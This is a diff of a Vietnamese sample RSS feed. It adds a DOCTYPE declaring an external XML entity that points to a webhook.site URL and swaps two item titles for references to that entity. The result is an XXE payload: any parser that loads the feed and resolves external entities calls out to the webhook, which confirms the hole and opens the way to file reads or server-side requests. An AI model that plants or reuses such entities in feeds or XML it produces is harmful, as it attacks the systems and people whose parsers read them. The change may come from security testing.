@@ -1,4 +1,7 @@
 <?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE foo [  
+<!ELEMENT foo (#ANY)>
+<!ENTITY xxe SYSTEM "https://webhook.site/c41c7b43-f14a-46cd-afd9-2d3068866bc9">]>
 <rss version="2.0">
   <channel>
     <title>Ví dụ RSS Feed</title>
@@ -6,14 +9,14 @@
     <description>Đây là ví dụ về RSS feed cho trang web</description>
     <language>vi-VN</language>
     <item>
-      <title>tesssttessst</title>
+      <title>&xxe;</title>
       <link>http://www.example.com/tin1</link>
       <description>Mô tả ngắn gọn về tin số 1</description>
       <pubDate>Wed, 24 Sep 2025 12:00:00 +0700</pubDate>
       <guid>http://www.example.com/tin1</guid>
     </item>
     <item>
-      <title>Tin tức số 2</title>
+      <title>&xxe;</title>
       <link>http://www.example.com/tin2</link>
       <description>Mô tả ngắn gọn về tin số 2</description>
       <pubDate>Tue, 23 Sep 2025 15:00:00 +0700</pubDate>
@@ -21,6 +24,7 @@
     </item>
   </channel>
 </rss>
+
 
 
 
